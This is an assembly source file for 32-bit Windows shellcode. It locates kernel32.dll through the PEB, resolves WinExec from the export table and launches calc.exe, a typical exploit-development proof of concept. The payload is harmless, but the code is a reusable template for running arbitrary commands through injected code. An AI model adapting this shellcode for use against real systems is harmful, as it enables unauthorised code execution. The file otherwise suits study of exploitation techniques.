; $ nasm -f bin shellcode32.asm
bits 32

base:
	jmp	entry

kernelName: dw 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0
winExecName: db "WinExec", 0
execArg: db "C:/WINDOWS/system32/calc", 0

getIp:
	mov	eax, [esp]
	ret

strlenPlusOne: ; string in edi, ret in ecx
	or	ecx, -1
	xor	al, al
	repne	scasb
	not	ecx
	ret

; STDCALL const char ** searchExportName(const char ** first, const char ** last, HINSTANCE base, const char * needle)
searchExportName:
	push	esi
	push	edi
	mov	edi, [esp + 0x18]
	call	strlenPlusOne
	mov	edx, ecx
	mov	eax, [esp + 0xc]
	jmp	loopEnter
loopBegin:
	mov	esi, [eax]
	add	esi, [esp + 0x14]
	mov	edi, [esp + 0x18]
	mov	ecx, edx
	repe	cmpsb
	je	found
	add	eax, 4
loopEnter:
	cmp	eax, [esp + 0x10]
	jbe	loopBegin
	int	3 ; don't care about error handling
found:
	pop	edi
	pop	esi
	ret	16

entry:
	; fetch loaded DLL list
	mov	eax, fs:[0x30] ; PEB pointer inside TEB
	mov	eax, [eax + 0xc] ; PEB_LDR_DATA *Ldr
	mov	ebx, [eax + 0x14] ; (LIST_ENTRY InMemoryOrderModuleList).forwardLink

	call	getIp
here:
	sub	eax, here - base
	push	eax
	lea	edx, [eax + kernelName - base]

	; search for kernel32.dll
lookForKernel32:
	mov	esi, [ebx + 0x28] ; UNICODE_STRING BaseDllName
	mov	edi, edx
	mov	ecx, 12 ; strlen("KERNEL32.DLL") + 1
	inc	ecx ; 13 is forbidden
	repe	cmpsw ; strncmp for wstring
	je	foundKernel

	; prepare for next iteration
	mov	ebx, [ebx] ; (LIST_ENTRY InMemoryOrderLinks).forwardLink
	test	ebx, ebx
	jnz	lookForKernel32
	int3	; don't care about error handling

foundKernel:
	; mov eax, [ebx + 0x18] ; DllBase
	mov	eax, [ebx + 0x10] ; DllBase

	; parse kernel32.dll's PE header to find WinExec
	push	eax ; stack: kernel base, shellcode base
	add	eax, [eax + 0x3c] ; offset of PE signature
	lea	esi, [eax + 4] ; COFF file header
	lea	edi, [esi + 20] ; optional header is after the COFF file header
	movzx	eax, word [edi + 0] ; magic (PE32 or PE32+)
	mov	ecx, 112 ; offset in PE32+
	cmp	eax, 0x10b ; PE32
	mov	eax, 96 ; offset in PE32
	cmove	ecx, eax
	mov	eax, [edi + ecx + 0] ; export directory table
	add	eax, [esp] ; rva to va
	push	eax ; stack: EDT, kernel base, shellcode base

	mov	ebx, eax ; EDT in ebx
	mov	ecx, [esp + 8]
	add	ecx, winExecName ; function to search
	mov	edi, [ebx + 32] ; Name Pointer Table rva
	add	edi, [esp + 4] ; rva to va
	mov	eax, [ebx + 24] ; number of names
	dec	eax
	shl	eax, 2
	add	eax, edi ; last name in the table

	mov	edx, [esp + 4]
	push	ecx
	push	edx
	push	eax
	push	edi
	call	searchExportName
	sub	eax, edi
	shr	eax, 1 ; elements in name table are 4 bytes, while in ordinal table 2
	add	eax, [ebx + 36] ; ordinal table rva
	add	eax, [esp + 4] ; rva to va
	movzx	eax, word [eax] ; ordinal export number
	shl	eax, 2
	add	eax, [ebx + 28] ; rva of exported address table
	add	eax, [esp + 4] ; rva to va
	mov	eax, [eax] ; rva of the function
	add	eax, [esp + 4] ; rva to va

	; WinExec(calc, SW_NORMAL)
	mov	ecx, [esp + 8]
	add	ecx, execArg - base
	push	dword 1
	push	ecx
	call	eax

	int3